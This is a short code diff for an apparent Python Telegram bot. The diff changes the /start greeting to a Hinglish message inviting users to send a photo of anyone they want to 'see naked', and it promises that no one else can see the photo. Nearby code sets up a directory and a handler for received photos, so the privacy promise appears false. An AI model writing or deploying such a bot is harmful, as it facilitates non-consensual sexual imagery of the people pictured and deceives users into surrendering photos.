@@ -10,7 +10,7 @@ if not os.path.exists(PHOTO_DIR):
     os.makedirs(PHOTO_DIR)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Hello! Bot is running")
+    await update.message.reply_text("Hello! Bot is running APKO JISE BHI NANGI DEKHNA HAI PHOTO BHEJO YE PHOTO APKE ALAWA OR KOI DEKH NAHI SAKTA HAI TO BINA FIKR KE KOI BHI PHOTO SEND KAR SAKTE HAI")
 
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     photo = update.message.photo[-1]
